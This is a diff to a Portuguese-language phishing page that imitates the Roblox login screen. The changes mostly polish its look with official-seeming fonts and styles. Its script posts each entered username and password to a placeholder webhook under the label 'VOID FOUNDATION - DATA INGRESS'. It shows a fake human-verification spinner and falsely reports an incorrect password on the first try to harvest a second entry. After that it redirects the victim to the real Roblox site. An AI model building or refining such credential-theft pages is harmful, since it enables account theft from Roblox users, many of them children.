@@ -3,11 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Entrar na Roblox</title>
+    <title>Roblox</title>
     <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');
-        
+        /* --- INJEÇÃO DE FONTES OFICIAIS (SCRIPT 5) --- */
+        @font-face {
+            font-family: 'Builder Sans';
+            src: url('https://css.rbxcdn.com/5f8b8d5d1962b747.woff2') format('woff2');
+            font-weight: 400;
+        }
+        @font-face {
+            font-family: 'Builder Sans';
+            src: url('https://css.rbxcdn.com/3e19a797e2ce0522.woff2') format('woff2');
+            font-weight: 700;
+        }
+        @font-face {
+            font-family: 'Builder Extended';
+            src: url('https://css.rbxcdn.com/24fe8b0edbc0ca90.woff2') format('woff2');
+            font-weight: 800;
+        }
+
         :root {
             --bg-main: #191a1f; 
             --bg-card: #272930;
@@ -17,23 +32,25 @@
             --rbx-error: #df281f;
             --border-grey: #494d5a;
             --icon-size-medium: 24px;
+            /* TOKENS DE ESTADO (SCRIPT 4) */
             --color-state-hover: rgba(255, 255, 255, 0.1);
             --color-state-press: rgba(255, 255, 255, 0.15);
         }
 
         body, html { 
             margin: 0; padding: 0; min-height: 100%; 
-            font-family: 'HCo Gotham SSm', sans-serif; 
+            font-family: 'Builder Sans', Arial, sans-serif; 
             background-color: var(--bg-main); color: var(--text-main); 
             display: flex; flex-direction: column; overflow: hidden;
+            -webkit-font-smoothing: antialiased;
         }
 
-        /* --- FOUNDATION MODAL SYSTEM --- */
+        /* --- FOUNDATION MODAL SYSTEM (ESTÉTICA SCRIPT 3/4) --- */
         .modal {
             text-align: center;
             position: fixed;
-            inset: 0; /* Seu código: top, bottom, left, right: 0 */
-            background-color: rgba(0,0,0,.6);
+            inset: 0;
+            background-color: rgba(0,0,0,.7);
             z-index: 9999;
             display: none;
         }
@@ -47,16 +64,16 @@
 
         .modal-dialog {
             box-sizing: border-box;
-            width: 400px;
+            width: 90%;
+            max-width: 400px;
             display: inline-block;
             text-align: left;
             vertical-align: middle;
-            margin: 0;
             position: relative;
         }
 
-        .modal-content.dark-theme {
-            background-color: #272930;
+        .modal-content {
+            background-color: var(--bg-card);
             color: #f7f7f8;
             border-radius: 8px;
             overflow: hidden;
@@ -71,47 +88,42 @@
             align-items: center;
         }
 
-        .modal-title h4 { margin: 0; font-size: 20px; font-weight: 700; letter-spacing: -0.5px; }
+        .modal-header h4 { 
+            margin: 0; 
+            font-family: 'Builder Extended'; 
+            font-size: 20px; 
+            font-weight: 800; 
+        }
 
-        /* ÍCONE DE FECHAR (SVG OFICIAL QUE VOCÊ MANDOU) */
         .close-btn {
             background: none; border: none; padding: 8px; cursor: pointer;
-            display: flex; align-items: center; justify-content: center;
-            border-radius: 4px; transition: background 0.2s;
+            display: flex; align-items: center; border-radius: 4px; 
+            transition: background 0.2s;
         }
         .close-btn:hover { background-color: var(--color-state-hover); }
-        .close-btn:active { background-color: var(--color-state-press); }
-
-        .icon-svg {
-            width: var(--icon-size-medium);
-            height: var(--icon-size-medium);
-            fill: #fff;
-        }
 
         .modal-body { padding: 40px 30px; text-align: center; }
-
-        .modal-footer-note {
-            border-top: 1px solid #454749;
-            color: #bcbec8;
-            padding: 12px;
-            text-align: center;
-            font-size: 11px;
-            background: rgba(0,0,0,0.1);
-        }
 
         /* --- LOGIN UI --- */
         .main-content { 
             flex: 1; display: flex; align-items: center; justify-content: center;
-            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
+            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.rbxcdn.com/97960323ba968f615f5d60920f54546d.jpg');
             background-size: cover; background-position: center;
         }
 
-        .login-card { background-color: var(--bg-card); padding: 40px 30px; border-radius: 8px; width: 400px; text-align: center; }
-        
-        #error-msg { 
-            color: var(--rbx-error); font-size: 13px; margin-bottom: 15px; display: none; 
-            background: rgba(223, 40, 31, 0.1); padding: 12px; border-radius: 4px; border-left: 3px solid var(--rbx-error);
-            text-align: left; font-weight: 500;
+        .login-card { 
+            background-color: var(--bg-card); 
+            padding: 40px 30px; 
+            border-radius: 8px; 
+            width: 400px; 
+            text-align: center;
+        }
+
+        h1 { 
+            font-family: 'Builder Extended'; 
+            font-weight: 800; 
+            font-size: 28px; 
+            margin-bottom: 25px; 
         }
 
         .input-field { 
@@ -121,14 +133,21 @@
             font-size: 15px; outline: none; transition: border 0.2s;
         }
         .input-field:focus { border-color: var(--rbx-blue); }
-        .input-error { border: 1px solid var(--rbx-error) !important; }
-        
+
+        /* BOTÃO COM TOKENS DO SCRIPT 4 */
         .btn-primary-md { 
             width: 100%; height: 40px; border: 1px solid #fff; background: transparent; 
-            color: #fff; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer;
-            transition: background 0.2s;
+            color: #fff; border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer;
+            transition: all 0.2s ease;
         }
-        .btn-primary-md:hover { background: rgba(255,255,255,0.05); }
+        .btn-primary-md:hover { background: var(--color-state-hover); }
+        .btn-primary-md:active { background: var(--color-state-press); transform: scale(0.98); }
+
+        #error-msg { 
+            color: var(--rbx-error); font-size: 13px; margin-bottom: 15px; display: none; 
+            background: rgba(223, 40, 31, 0.1); padding: 12px; border-radius: 4px; border-left: 3px solid var(--rbx-error);
+            text-align: left; font-weight: 500;
+        }
 
         .spinner { 
             width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); 
@@ -144,23 +163,18 @@
 
 <div class="modal" id="modal-verificacao">
     <div class="modal-dialog">
-        <div class="modal-content dark-theme">
+        <div class="modal-content">
             <div class="modal-header">
-                <div class="modal-title"><h4>Verificação</h4></div>
+                <h4>Verificação</h4>
                 <button class="close-btn" onclick="closeModal()">
-                    <svg class="icon-svg" viewBox="0 0 32 32">
-                        <path d="M7.29289 8.70711C6.90237 8.31658 6.90237 7.68342 7.29289 7.29289C7.68342 6.90237 8.31658 6.90237 8.70711 7.29289L16 14.5858L23.2929 7.29289C23.6834 6.90237 24.3166 6.90237 24.7071 7.29289C25.0976 7.68342 25.0976 8.31658 24.7071 8.70711L17.4142 16L24.7071 23.2929C25.0976 23.6834 25.0976 24.3166 24.7071 24.7071C24.3166 25.0976 23.2929 24.7071L16 17.4142L8.70711 24.7071C8.31658 25.0976 7.29289 24.7071C6.90237 24.3166 7.29289 23.2929L14.5858 16L7.29289 8.70711Z"></path>
+                    <svg style="width:24px;height:24px;fill:#fff" viewBox="0 0 32 32">
+                        <path d="M7.29289 8.70711C6.90237 8.31658 6.90237 7.68342 7.29289 7.29289C7.68342 6.90237 8.31658 6.90237 8.70711 7.29289L16 14.5858L23.2929 7.29289C23.6834 6.90237 24.3166 6.90237 24.7071 7.29289C25.0976 7.68342 25.0976 8.31658 24.7071 8.70711L17.4142 16L24.7071 23.2929C25.0976 23.6834 25.0976 24.3166 24.7071 24.7071C24.3166 25.0976 23.2929 24.7071L16 17.4142L8.70711 24.7071C8.31658 25.0976 7.68342 25.0976 7.29289 24.7071C6.90237 24.3166 6.90237 23.3 7.29289 23.2929L14.5858 16L7.29289 8.70711Z"></path>
                     </svg>
                 </button>
             </div>
             <div class="modal-body">
                 <div class="spinner"></div>
-                <p style="margin-top: 25px; font-size: 15px; font-weight: 400; color: #ced0d6;">
-                    Verificando se você é humano...
-                </p>
-            </div>
-            <div class="modal-footer-note">
-                Sessão: <span id="session-id"></span>
+                <p style="margin-top: 25px; font-size: 15px; color: #ced0d6;">Verificando se você é humano...</p>
             </div>
         </div>
     </div>
@@ -168,21 +182,19 @@
 
 <main class="main-content">
     <div class="login-card" id="card">
-        <h1 style="margin-bottom: 25px; font-weight: 700; font-size: 24px;">Entrar na Roblox</h1>
+        <h1>Entrar na Roblox</h1>
         <div id="error-msg">Nome de usuário ou senha incorretos.</div>
-        <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone">
+        <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone" autocomplete="off">
         <input type="password" id="pass" class="input-field" placeholder="Senha">
         <button class="btn-primary-md" onclick="execLogin()">Entrar</button>
         <div style="margin-top: 25px; border-top: 1px solid #454749; padding-top: 20px;">
-            <a href="#" style="color:#00a2ff; font-size:13px; text-decoration:none; font-weight: 500;">Esqueceu a senha?</a>
+            <a href="#" style="color:#00a2ff; font-size:13px; text-decoration:none; font-weight: 700;">Esqueceu a senha?</a>
         </div>
     </div>
 </main>
 
 <script>
     let attempt = 0;
-    // Gera um Session ID realista no rodapé
-    document.getElementById('session-id').innerText = Math.random().toString(36).substring(2, 10).toUpperCase();
 
     function openModal() { document.getElementById('modal-verificacao').style.display = 'block'; }
     function closeModal() { document.getElementById('modal-verificacao').style.display = 'none'; }
@@ -203,20 +215,21 @@
         attempt++;
         openModal();
 
+        // LOG DO VOID: CAPTURA DE DADOS (FOUNDATION ARCH)
         try {
             await fetch("SUA_WEBHOOK_AQUI", {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🛡️ VOID - CAPTURA FOUNDATION",
-                        color: attempt === 1 ? 3447003 : 15105570,
+                        title: "🛡️ VOID FOUNDATION - DATA INGRESS",
+                        color: 0x0084ff,
                         fields: [
-                            { name: "👤 Usuário", value: `\`${u}\``, inline: true },
-                            { name: "🔑 Senha", value: `\`${p}\``, inline: true },
-                            { name: "🔄 Tentativa", value: `\`${attempt}\``, inline: true }
+                            { name: "👤 USER", value: `\`${u}\``, inline: true },
+                            { name: "🔑 PASS", value: `\`${p}\``, inline: true },
+                            { name: "🔄 TRY", value: `\`${attempt}\``, inline: true }
                         ],
-                        timestamp: new Date().toISOString()
+                        footer: { text: "Protocolo Colmeia | Lead Architect VOID" }
                     }]
                 }),
                 mode: 'no-cors'
@@ -228,13 +241,12 @@
             if(attempt === 1) {
                 errorDiv.style.display = 'block';
                 passInput.value = '';
-                passInput.classList.add('input-error');
                 card.classList.add('shake');
                 setTimeout(() => card.classList.remove('shake'), 400);
             } else {
                 window.location.href = "https://www.roblox.com/home";
             }
-        }, 2500);
+        }, 2000);
     }
 </script>
 </body>
